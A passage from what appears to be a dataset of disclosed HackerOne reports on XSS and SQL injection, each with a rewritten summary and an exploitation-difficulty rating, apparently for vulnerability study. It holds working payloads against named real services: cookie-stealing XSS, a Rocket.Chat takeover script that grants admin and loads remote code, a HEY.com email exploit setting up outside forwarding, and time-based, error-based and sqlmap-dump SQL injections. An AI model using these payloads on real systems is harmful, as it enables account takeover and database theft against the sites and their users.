https://wordpress.com/read/feeds/{blog_id}/posts/{post_id}
https://yoursubdomain.wordpress.com
using the payload:
Code 92 Bytes
1<iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;
Steps To Reproduce:
As a comment
Log in to wordpress.com
Choose a post from the feeds
Add a comment with the payload: <iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;
Log in to wordpress.com
Choose a post from the feeds
Add a comment with the payload: <iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;
By clicking on Click Here, an alert will fire with cookies of the domain wordpress.com
As a post
Log in to wordpress.com
Create a new post or site.
Add the payload <iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt; to the body or the title of the blog post
preview or publish your new blog post
By clicking on Click Here, an alert will fire with cookies of the domain yoursubdomain.wordpress.com or wordpress.com if the post is previewed from the WordPress feed.
Log in to wordpress.com
Create a new post or site.
Add the payload <iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt; to the body or the title of the blog post
preview or publish your new blog post
By clicking on Click Here, an alert will fire with cookies of the domain yoursubdomain.wordpress.com or wordpress.com if the post is previewed from the WordPress feed.
If you add comments to your blog post and using the payload mentioned above as a comment an Stored XSS alert will fire when you click on the link.
Impact
Perform arbitrary requests on the behalf of other users with security context of wordpress.com or blogsubdomain.wordpress.com
Read any data the attacked user has access to.



================================================================================
Vulnerability Description:
Stored XSS vulnerability in WordPress.com allows an attacker to inject malicious JavaScript code via comments or posts, which executes in the context of the victim's session when viewed, potentially leading to session hijacking or other malicious actions.

Steps to Reproduce:
1. Log in to wordpress.com
2. Choose a post from the feeds
3. Add a comment with the payload: <iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;
4. By clicking on 'Click Here', an alert will fire with cookies of the domain wordpress.com
Exploitation Difficulty:
The vulnerability involves a straightforward injection of a well-known XSS payload into comment or post fields, which is a common and well-documented attack vector. The steps to reproduce are simple and do not require complex interactions or state manipulations.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/735638: Account takeover via XSS
================================================================================
RAW DESCRIPTION:

Summary: By combining AutoLinker and Markdown an attacker is able to inject malicious scripts.
Description: By combining AutoLinker and Markdown we can trick the parser into breaking out of the current HTML attribute.
Code 229 Bytes
1https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[] target=_blank data-x=`.`)
results in:
Code 494 Bytes
1<a href="https://a?p=<a href=" https:="" style="animation-duration:1s;animation-name:blink;animation-iteration-count:2" onanimationiteration="Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[]" target="_blank" data-x="<span" class="copyonly">`<span><code class="code-colors inline">.</code></span><span class="copyonly">`</span>" target="_blank" rel="noopener noreferrer"&gt; </a>
2" target="_blank" rel="noopener noreferrer"&gt;https://a?p==!=7vrXTtDtYHrLJ4Z7y=!="
To obtain the login-token of the victim we can either use document.cookie or localStorage.getItem('Meteor.loginToken').
Since we can authenticate against the websocket using this token, we can perform any actions in the context of the victim (change password, email etc.).
Releases Affected:
Rocket.Chat-Desktop-Client: v2.16.2
Rocket.Chat-Server: v2.0.0
Apps-Engine-Version: v1.5.2
Steps To Reproduce (from initial installation to vulnerability):
In this example, the role admin is assigned to the desired user as far as the victim has the required permissions.
Code (replace {ATTACKER_USERID} and {ATTACKER_EMAIL}):
Code 1.11 KiB
1    let ws = new WebSocket(`wss://${window.location.host}/sockjs/111/evilwss/websocket`);
2    ws.onmessage = function (evt) {
3        if (/\["{\\"msg\\":\\"pong\\"}"\]/.test(event.data)) {
4            ws.send('["{\\"msg\\":\\"pong\\"}"]');
5        }
6        if (/a\["{\\"server_id\\":\\"(.*)\\"}"\]/.test(event.data)) {
7            ws.send('["{\\"msg\\":\\"connect\\",\\"version\\":\\"1\\",\\"support\\":[\\"1\\",\\"pre2\\",\\"pre1\\"]}"]');
8            ws.send(`["{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"resume\\":\\"${localStorage.getItem('Meteor.loginToken')}\\"}],\\"id\\":\\"1\\"}"]`);
9        }
10        if (/a\["{\\"msg\\":\\"connected\\",\\"session\\":\\"(.*)\\"}"\]/.test(event.data)) {
11            ws.send('["{\\"msg\\":\\"method\\",\\"method\\":\\"insertOrUpdateUser\\",\\"params\\":[{\\"_id\\":\\"{ATTACKER_USERID}\\",\\"statusText\\":\\"\\",\\"email\\":\\"{ATTACKER_EMAIL}\\",\\"verified\\":false,\\"password\\":\\"\\",\\"requirePasswordChange\\":false,\\"joinDefaultChannels\\":false,\\"sendWelcomeEmail\\":false,\\"roles\\":[\\"user\\",\\"admin\\"]}],\\"id\\":\\"17\\"}"]');
12        }
13    };
Payload (replace sectex.dev\x2ffiles\x2fcswsh.js):
Code 364 Bytes
1https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\x28\x27script\x27\x29;s.src=\x27\x68\x74\x74\x70\x73\x3a\x2f\x2fsectex.dev\x2ffiles\x2fcswsh.js\x27;document.body.appendChild\x28s\x29;'instanceof[] target=_blank data-x=`.`)
Supporting Material/References:
Suggested mitigation
Fix initial XSS
Impact
Attackers can execute scripts which can lead to:
Account takeover
Abitrary file read in Rocket.Chat-Desktop
RCE in Rocket.Chat-Desktop (#276031)
Account takeover
Abitrary file read in Rocket.Chat-Desktop
RCE in Rocket.Chat-Desktop (#276031)



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to perform an account takeover via XSS by injecting malicious scripts through a combination of AutoLinker and Markdown. The attacker can steal the victim's login token and authenticate against the websocket to perform actions as the victim.

Steps to Reproduce:
1. Inject a malicious XSS payload by combining AutoLinker and Markdown to break out of the HTML attribute context.
2. Use the injected script to steal the victim's login token via document.cookie or localStorage.getItem('Meteor.loginToken').
3. Authenticate against the websocket using the stolen token to perform actions in the victim's context (e.g., change password, email, etc.).
Exploitation Difficulty:
The attack involves multiple components (XSS injection, token theft, websocket authentication) and requires understanding subtle interactions between AutoLinker and Markdown parsing. Additionally, the attack manipulates complex application states (websocket sessions) and uses novel logic (animation events for script execution).

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/765679: Stored XSS on upload files leads to steal cookie
================================================================================
RAW DESCRIPTION:

Summary:
There isn't a check mechanism on file format in Inbox which an attacker can send an SVG file as other formats such as png, gif or bmp by rename and change file format leads XSS attack and steal victim cookies.
Steps To Reproduce:
You should create 2 accounts :
First account for the attacker and second one for the victim.
The attacker in my scenario: seq@seq.teamoutpost.com
The victim in my scenario: seq1@seq1.teamoutpost.com
Please log in to the first account via this [link] (https://app.outpost.co/sign-in)
From Inbox create New Conversation and attached following files (Attached on this report) and send These files are an SVG file which changes file format to png, bmp, gif If you want to see payload open file by notepad. you'll see payload like the following code :
Code 207 Bytes
1<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
2 width="2560.000000pt" height="1600.000000pt" viewBox="0 0 2560.000000 1600.000000"
3 preserveAspectRatio="xMidYMid meet" onload="alert(document.cookie)">
Whenever victim clicks on each file, open a new tab and XSS attack occurs and steal the victim's cookie.
Supporting Material/References:
Browsers :
Mozilla Firefox 71.0
Google Chrome 79.0.3945.88
[attachment / reference]
For clarification, you can watch POC file (Attached on this report)
If you have any questions, let me know.
Best regards.
Impact
Attacker can send malicious files to victims and steals victim's cookie leads to account takeover.



================================================================================
Vulnerability Description:
A stored XSS vulnerability exists in the file upload functionality, where an attacker can upload a malicious SVG file disguised as another format (e.g., .png, .gif, .bmp). When the victim interacts with the file, the XSS payload executes, allowing the attacker to steal the victim's cookies and potentially take over their account.

Steps to Reproduce:
1. Create two accounts: one for the attacker (e.g., seq@seq.teamoutpost.com) and one for the victim (e.g., seq1@seq1.teamoutpost.com).
2. Log in as the attacker and create a new conversation in the Inbox. Attach a malicious SVG file renamed to a different format (e.g., .png, .gif, .bmp) containing an XSS payload (e.g., `<svg ... onload="alert(document.cookie)">`).
3. Send the malicious file to the victim. When the victim clicks on the file, the XSS payload executes, stealing their cookie.
Exploitation Difficulty:
The vulnerability involves a straightforward exploitation of missing file format validation and a common XSS payload. The steps are simple and do not require complex interactions or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/974271: Stored XSS on https://app.crowdsignal.com/surveys/[Survey-Id]/question - Bypass
================================================================================
RAW DESCRIPTION:

Hello there,
I hope all is well!
I found a stored xss on https://app.crowdsignal.com/
Steps:
Go to https://app.crowdsignal.com/dashboard
Create a survey.
Go to https://app.crowdsignal.com/quizzes/{survey-id}/question
Add Multiple Choice
Click Add media button.
Select Embed Media
Paste this: [dailymotion id=x8oma9]
Insert it.
Open Burp Suite and click Save button.
Return to burp suite and paste xss payload to media[11111111] parameter: [dailymotion id=x8oma9"><svg/onload=prompt(document.domain)>]
Forward the request and refresh the page. You will see xss alert.
This isn't self xss because I saw users who Team plan can invite other users to their dashboards. So attacker can steal victim's cookies.
Impact
Stealing cookies.
Best Regards,
@mygf



================================================================================
Vulnerability Description:
A stored XSS vulnerability exists in the media embedding feature of Crowdsignal surveys. By embedding a manipulated media payload, an attacker can execute arbitrary JavaScript in the context of the survey page, potentially stealing cookies or performing other malicious actions.

Steps to Reproduce:
1. Go to https://app.crowdsignal.com/dashboard and create a survey.
2. Navigate to https://app.crowdsignal.com/quizzes/{survey-id}/question and add a Multiple Choice question.
3. Click the 'Add media' button and select 'Embed Media'.
4. Paste the initial payload: [dailymotion id=x8oma9] and insert it.
5. Open Burp Suite, click 'Save', and intercept the request.
6. Modify the 'media[11111111]' parameter in the intercepted request to include the XSS payload: [dailymotion id=x8oma9"><svg/onload=prompt(document.domain)>].
7. Forward the request and refresh the page to see the XSS alert.
Exploitation Difficulty:
The vulnerability involves multiple steps including survey creation, media embedding, and request manipulation. However, the steps are straightforward and the XSS payload is a common pattern. The interaction between the media embedding and the parameter manipulation is not particularly subtle or complex.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/982291: HEY.com email stored XSS
================================================================================
RAW DESCRIPTION:

An attacker can bypass the HEY.com HTML sanitizer and inject arbitrary unsafe HTML in emails.
To reproduce the bug you have to send raw HTML-formatted email. You can do it e.g. with the Sendmail tool on Linux.
Example email:
Code 547 Bytes
1From: jouko@klikki.fi
2To: jouko@hey.com
3Subject: HackerOne test
4MIME-Version: 1.0
5Content-type: text/html
6
7<style>
8url(cid://\00003c\000027message-content\00003e\00003ctemplate\00003e\00003cstyle\00003exxx);
9url(cid://\00003c/style\00003e\00003c/template\00003e\00003c/message-content\00003e\00003cform\000020action=/my/accounts/266986/forwardings/outbounds\000020data-controller=beacon\00003e\00003cinput\000020type=text\000020name=contact_outbound_forwarding[to_email_address]\000020value=joukop@gmail.com\00003e\00003c/form\00003exxx);
10</style>
To send the email, create a text file with the above contents. Send it with the command
Code 33 Bytes
1/usr/sbin/sendmail -t < email.txt
The backslashes in the <style> tag are decoded. The first \000027 confuses the HTML filter. The encoded <message-content> and <template> tags are there to escape the DOM shadowroot element. The HTML filter doesn't let you inject only closing tags, i.e. </template>, you need an opening tag first.
Finally, HTML like this is injected:
Code 185 Bytes
1<form action="/my/accounts/266986/forwardings/outbound" data-controller="beacon">
2<input type=text name="contact_outbound_forwarding[to_email_address]" value="joukop@gmail.com">
3</form>
This exploits the Stimulus framework and the existing JavaScript controllers to post the form automatically. The CSRF token is inserted by the framework. This example sets up email forwarding to an external address.
This is just one way to exploit the bug. Even though plain <script> won't work in modern browsers due to the Content Security Policy, It seems likely there are ways to bypass it by using the JS frameworks (will look at this more). The account ID in this PoC has to be guesstimated or brute forced (266986).
Another example is to simply set the form action to an attacker URL. This will send the user's CSRF token to the attacker so that it could be used in a subsequent attack.
<image_0>
If you want to view the email on my HEY account (jouko@hey.com) the email ID is 83625339.
Impact
A HEY user viewing an email sent by the attacker may have their account compromised.



================================================================================
Vulnerability Description:
An attacker can bypass HEY.com's HTML sanitizer to inject arbitrary unsafe HTML in emails, leading to stored XSS. This can be exploited to perform actions like setting up email forwarding to an external address or stealing CSRF tokens.

Steps to Reproduce:
1. Create a text file with the email content including the malicious HTML and CSS.
2. Send the email using the sendmail command: `/usr/sbin/sendmail -t < email.txt`.
3. The recipient views the email in HEY.com, triggering the XSS payload.
Exploitation Difficulty:
The attack involves bypassing HTML sanitization through non-obvious encoding techniques, leveraging shadow DOM elements, and exploiting existing JavaScript controllers. It requires understanding of HTML/CSS encoding, DOM manipulation, and the application's JavaScript framework.

--------------------------------------------------------------------------------



SQL Injection Vulnerabilities (11 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1018621: [████] SQL Injections on Referer Header exploitable via Time-Based method
================================================================================
RAW DESCRIPTION:

Summary:
SQL Injections on Referer Header exploitable via Time-Based method
Description:
https://owasp.org/www-community/attacks/SQL_Injection
## Impact
https://owasp.org/www-community/attacks/SQL_Injection
## Step-by-step Reproduction Instructions
First, vulnerable points:
https://███████/███████/library.php?alert=
https://██████████/████████/Chart01.php?alert=
https://████████/████/Chart02.php?alert=
https://██████████/█████████/Chart03.php?alert=
https://████/█████Prod.php?alert=
https://██████████/█████systems.php?alert=
https://█████████/██████████db.php?alert=
(Don't miss the alert GET parameter...)
Okay, let's check the SQLi... lets use time and curl with a true condition (1=1), if 1=1, then, the server sleep 20 seconds else nothing (I just wrote false to make it explicit for you):
time curl -s -H "Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'" --url "https://████████/█████/Chart01.php?alert="
Okay..then.. let's check the response:
Code 794 Bytes
1real	0m21,447s
2user	0m0,029s
3sys	0m0,000s```
4
5The time is 21 seconds.. then.. let's update the if condition as false (1=2)
6
7```time curl -s -H "Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'" --url "https://████████/████████/Chart01.php?alert=" ```
8
9Response:
10
11```Thank you - you may close this window
12real	0m1,806s
13user	0m0,016s
14sys	0m0,008s```
15
16Hmm.. approx 2 seconds.. we have proof that's vuln.. let's try more..
17I want the first character of the current database name..
18let's go for it!:
19
20```for i in {{a..z},{1..9}}; do echo "Testing $i char:"; time curl -s -H "Referer: '+(select*from(select(if(substring(database(),1,1)='$i',sleep(20),false)))a)+'" --url "https://████/██████/Chart01.php?alert="; done```
21
22And there are only one-second answers from time except for the m!
23
Testing l char:
Thank you - you may close this window
real 0m1,321s
user 0m0,028s
sys 0m0,000s
Testing m char:
Thank you - you may close this window
real 0m21,299s
user 0m0,019s
sys 0m0,010s
Testing n char:
Thank you - you may close this window
real 0m1,331s
user 0m0,016s
sys 0m0,012s
Code 215 Bytes
1
2Thanks for reading!
3
4There is one of these injection points that is supposedly fixed at report #995122 (report disclosed, resolved.. but it's not..)
5
6## Impact
7
8https://owasp.org/www-community/attacks/SQL_Injection



================================================================================
Vulnerability Description:
The vulnerability is a time-based SQL injection in the Referer header of several endpoints. Attackers can manipulate the Referer header to execute arbitrary SQL commands, allowing them to extract database information by observing response delays.

Steps to Reproduce:
1. Identify vulnerable endpoints by checking the Referer header in HTTP requests to URLs like https://████████/█████/Chart01.php?alert=
2. Use time-based SQL injection via the Referer header with a payload like: '+(select*from(select(if(1=1,sleep(20),false)))a)+'
3. Observe the response time; a delay indicates a successful injection (e.g., 21 seconds for true condition, 2 seconds for false)
4. Extract database information by modifying the payload to test conditions like substring(database(),1,1)='m'
Exploitation Difficulty:
The attack involves a straightforward exploitation of a common vulnerability (SQL injection) using a well-documented technique (time-based). The steps are linear and do not require complex application state manipulation or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1069531: Blind SQL Injection 
================================================================================
RAW DESCRIPTION:

hello dear support
I have found Blind SQL Injection on https://futexpert.mtngbissau.com/signin/
parameters injectable phone_number=0&pin=1&submit=Continuar via post
URL:https://futexpert.mtngbissau.com/signin/
Post: email=0
my payload : phone_number=0'XOR(if(now()=sysdate()%2Csleep(0)%2C0))XOR'Z&pin=1&submit=Continuar
HTTP request
Code 725 Bytes
1POST /signin/ HTTP/1.1
2Host: futexpert.mtngbissau.com
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Content-Type: application/x-www-form-urlencoded
8Content-Length: 116
9Origin: https://futexpert.mtngbissau.com
10Connection: close
11Referer: https://futexpert.mtngbissau.com/signin/
12Cookie: _ga=GA1.2.807090149.1609258213; _gid=GA1.2.432006610.1609466934; PHPSESSID=87pejs8h0usb0ill37hit63an5
13Upgrade-Insecure-Requests: 1
14
15phone_number=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%2812%29%2C0%29%29XOR%27Z+%3D%3E&pin=1&submit=Continuar
16
if you need more info I'm here thank you
Impact
An attacker can use SQL injection it to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.



================================================================================
Vulnerability Description:
The vulnerability is a Blind SQL Injection in the login form of the website. The attacker can manipulate the phone_number parameter to execute arbitrary SQL commands, potentially bypassing authentication, retrieving database contents, or modifying data.

Steps to Reproduce:
1. Send a POST request to https://futexpert.mtngbissau.com/signin/ with the following parameters: phone_number=0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z&pin=1&submit=Continuar
2. Observe the response time or behavior to confirm if the sleep function was executed, indicating a successful Blind SQL Injection
Exploitation Difficulty:
The attack involves a straightforward SQL injection payload targeting a single parameter. While it requires knowledge of SQL injection techniques, the payload is not complex and does not involve multiple components or subtle interactions.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1262757: SQL injection located in `███` in POST param `████████` 
================================================================================
RAW DESCRIPTION:

Hey DoD security team!
I was able to exploit an SQL injection [1] in one of your domains.
Description
An SQL injection [1] was discovered in domain https://████████/██████ in the parameter ██████████. The SQL injection was located in a WHERE statment fallowed by a INT value.
The vulnerable parameter gave an indication quick with an SQL syntax error. That exposed it was an ████ database [2] in the backend.
Proof Of Concept
Discovered the SQL injection by inputting an random value to trigger an SQL syntax error.
Discover_Payload: ██████████
████
The fallowing payload was used for the SQL injection to be be triggered
Payload: 2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)
██████
Full exploit and gather information from the MYSQL database:
████
References
[1] https://portswigger.net/web-security/sql-injection - SQL injection explained
[2] https://www.mysqltutorial.org/mysql-where/ - MYSQL WHERE statment explained
[3] https://www.mysql.com/ - MYSQL Database
Impact
An attacker is able to gather all information stored in the database using boolen based SQL injection. (FULL database controll.)
System Host(s)
███████
Affected Product(s) and Version(s)
The whole database is affected and I'm able to gather all information stored in it.
CVE Numbers
Steps to Reproduce
Go to the domain **
Now intercept the request with Burp Suite.
Replace the raw data with the fallowing:
Code 473 Bytes
1POST /██████ HTTP/1.1
2Host: ██████████
3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Content-Type: application/x-www-form-urlencoded
8Content-Length: 106
9Origin: https://█████████
10Referer: https://████████/█████████
11Upgrade-Insecure-Requests: 1
12Te: trailers
13Connection: close
14
15██████=2021█████
4 . Save request in Burp Suite => Right click => save item + Name it.
5. Run sqlmap command: sqlmap -f --risk 2 -r /home/kali/Desktop/sql --dbms=mysql --tables --dump -p ██████████.
It will quick discover the ███ to be vulnerable for SQL injection and XSS. Wait to it detect and verify it. It will then dump the tables.
as fallowing: (Only gather table and stoped after just as a proof of concept)
████
Suggested Mitigation/Remediation Actions
Make sure to filter out SQL syntax and quotes and never trust user input.



================================================================================
Vulnerability Description:
An SQL injection vulnerability was found in a POST parameter of a web application, allowing an attacker to execute arbitrary SQL queries and potentially gain full control over the MySQL database.

Steps to Reproduce:
1. Intercept the request to the vulnerable endpoint using Burp Suite.
2. Modify the POST parameter with the SQL injection payload: `2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)`.
3. Use sqlmap to automate the exploitation: `sqlmap -f --risk 2 -r /home/kali/Desktop/sql --dbms=mysql --tables --dump -p [parameter_name]`.
Exploitation Difficulty:
The vulnerability involves straightforward SQL injection techniques with no complex interactions or novel logic required. The attack is well-documented and uses common tools like Burp Suite and sqlmap.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1626226: Unauthenticated SQL Injection at █████████  [HtUS]
================================================================================
RAW DESCRIPTION:

Summary
Hi team, I found Unauthenticated SQL Injection at ██████. Because of non-filter and non-escape input at API /api/organizations/*, attacker can inject malicious payload after single quote (') to exploit and extract database.
Step to Reproduce:
Execute Request
Code 465 Bytes
1GET /api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+user()))))=1--%20aa HTTP/1.1
2Host: ████ 
3User-Agent: Mozilla/5.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
5Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 
6Accept-Encoding: gzip, deflate 
7Upgrade-Insecure-Requests: 1 
8Sec-Fetch-Dest: document 
9Sec-Fetch-Mode: navigate 
10Sec-Fetch-Site: none 
11Sec-Fetch-User: ?1 
12Te: trailers
13
14
15
Then the response is
Code 883 Bytes
1HTTP/1.1 500 Internal Server Error
2Content-Type: application/json; charset=utf-8
3Content-Length: 209
4Cross-Origin-Embedder-Policy: require-corp
5Cross-Origin-Opener-Policy: same-origin
6Cross-Origin-Resource-Policy: same-origin
7X-DNS-Prefetch-Control: off
8Expect-CT: max-age=0
9X-Frame-Options: SAMEORIGIN
10X-Download-Options: noopen
11X-Content-Type-Options: nosniff
12Origin-Agent-Cluster: ?1
13X-Permitted-Cross-Domain-Policies: none
14Referrer-Policy: no-referrer
15X-XSS-Protection: 0
16Strict-Transport-Security: max-age=31536000
17Expires: Tue, 05 Jul 2022 04:12:11 GMT
18Cache-Control: max-age=0, no-cache, no-store
19Pragma: no-cache
20Date: Tue, 05 Jul 2022 04:12:11 GMT
21Connection: keep-alive
22
23{"statusCode":500,"code":"P2010","error":"Internal Server Error","message":"\nInvalid `prisma.queryRaw()` invocation:\n\n\n  Raw query failed. Code: `1105`. Message: `XPATH syntax error: ':█████████'`"}
The result was leaked by SQL XPATH Error, so we get user() = ████████
Change query to version() we get version = 8.0.23
https://██████/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+version()))))=1--%20aa
Change query to version() we get database = ███
https://███/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+database()))))=1--%20aa
█████████
██████████
███
To extract data, we use this requests
Code 490 Bytes
1GET /api/organizations/'or(extractvalue(1,concat(1,(select(table_name)from%20information_schema.tables%20limit%2054,1))))=' HTTP/1.1
2Host: ████ 
3User-Agent: Mozilla/5.0  
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
5Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 
6Accept-Encoding: gzip, deflate 
7Upgrade-Insecure-Requests: 1 
8Sec-Fetch-Dest: document 
9Sec-Fetch-Mode: navigate 
10Sec-Fetch-Site: none 
11Sec-Fetch-User: ?1 
12Te: trailers
13
14
█████
Impact
Attacker can extract database from server █████



================================================================================
Vulnerability Description:
An unauthenticated SQL injection vulnerability exists in the `/api/organizations/*` endpoint due to lack of input filtering and escaping. Attackers can inject malicious SQL payloads to extract sensitive database information via error-based techniques.

Steps to Reproduce:
1. Send a GET request to the vulnerable endpoint with a SQL injection payload: `/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+user()))))=1--%20aa`
2. Observe the error response containing database information (e.g., user, version, or database name) in the XPATH error message.
Exploitation Difficulty:
The vulnerability is straightforward to exploit using common SQL injection techniques (error-based) without requiring complex application state manipulation or novel logic. The attack involves a single component (the vulnerable endpoint) and follows well-known patterns for SQL injection.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/178632: [afocusp.informatica.com] Sql injection  afocusp.informatica.com:37777
================================================================================
RAW DESCRIPTION:

hi !There is another sql injection on host afocusp.informatica.com:37777
POC
version
http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+*+from+v$version
hostname of the database server
psvlxtdapp1.inf
http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'HOST',+15)+ipaddr+from+dual
IP address of the database server (local)
10.1.192.93
http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'IP_ADDRESS',+15)+ipaddr+from+dual
Ps
You need to patch all servers with the url /pls/apex/f? this is old bug in oracle.



================================================================================
Vulnerability Description:
This vulnerability is a SQL injection in the Oracle APEX application hosted at afocusp.informatica.com:37777. The attacker can inject SQL queries via the URL parameter to retrieve sensitive information such as the database version, hostname, and IP address of the database server. The vulnerability exploits the OWA_UTIL.CELLSPRINT function in Oracle APEX, which is a known issue in older versions.

Steps to Reproduce:
1. Access the URL http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+*+from+v$version to retrieve the database version.
2. Access the URL http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'HOST',+15)+ipaddr+from+dual to retrieve the hostname of the database server.
3. Access the URL http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'IP_ADDRESS',+15)+ipaddr+from+dual to retrieve the IP address of the database server.
Exploitation Difficulty:
The vulnerability involves a straightforward SQL injection attack using a known exploit in Oracle APEX. The attack does not require multiple components, complex application states, or novel logic. The steps are simple and the interactions are obvious, making the discovery difficulty low.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2209130: SQL Injection on prod.oidc-proxy.prod.webservices.mozgcp.net via invite_code parameter - Mozilla social inscription
================================================================================
RAW DESCRIPTION:

Hi everyone,
Hope you are well !
I wanted to play on https://mozilla.social, however this requires a user account and an invitation code as it's not open to the public. When entering an invitation code, the user is redirected to prod.oidc-proxy.prod.webservices.mozgcp.net.
<image_0>
Playing around with what's on offer, I've noticed that the invite_code parameter is vulnerable to a PostgreSQL injection.
Steps To Reproduce:
During registration, the following POST request is made :
Code 861 Bytes
1POST /interaction/KTTbkN8LaJgYIb7fIwPYX/signup HTTP/2
2Host: prod.oidc-proxy.prod.webservices.mozgcp.net
3Cookie: <session_cookies>
4User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.9999.0 Safari/537.36
5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
6Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
7Accept-Encoding: gzip, deflate, br
8Content-Type: application/x-www-form-urlencoded
9Content-Length: 119
10Origin: null
11Upgrade-Insecure-Requests: 1
12Sec-Fetch-Dest: document
13Sec-Fetch-Mode: navigate
14Sec-Fetch-Site: same-origin
15Sec-Fetch-User: ?1
16Sec-Ch-Ua-Platform: "macOS"
17Sec-Ch-Ua: "Google Chrome";v="103", "Chromium";v="103", "Not=A?Brand";v="24"
18Sec-Ch-Ua-Mobile: ?0
19Te: trailers
20
21handle=xxx&display_name=xxx&invite_code=xxx-&age=25&terms=on&rules=on
Adding a single quote to the invite_code parameter returns a 500 error, and adding a second quote returns a 200. Red flag
After a few tests, here is a time-based blind payload to confirm the vulnerability :
Code 50 Bytes
1invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(5))--
<image_1>
Confirm with the response from the server - which takes 5 seconds to reply.
Now, 10 seconds :
Code 51 Bytes
1invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(10))--
<image_2>
Same here, 10 secs before getting an answer.
20 sec :
Code 51 Bytes
1invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(20))--
<image_3>
etc.
Impact
From OWASP :
A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.
I'm working on a data exfiltration and will update the report as needed.
Looking forward to exchanging.
Regards,
Supr4s



================================================================================
Vulnerability Description:
The invite_code parameter in the registration process is vulnerable to PostgreSQL injection, allowing an attacker to execute arbitrary SQL commands, potentially leading to data exfiltration or other malicious activities.

Steps to Reproduce:
1. During registration, make a POST request to /interaction/KTTbkN8LaJgYIb7fIwPYX/signup with the invite_code parameter containing a single quote to observe a 500 error.
2. Use a time-based blind SQL injection payload like invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(5))-- to confirm the vulnerability by observing delayed responses.
Exploitation Difficulty:
The vulnerability involves a straightforward SQL injection technique with clear indicators (error responses and time delays) that make it relatively easy to discover. The attack does not require complex interactions or state manipulation.

--------------------------------------------------------------------------------

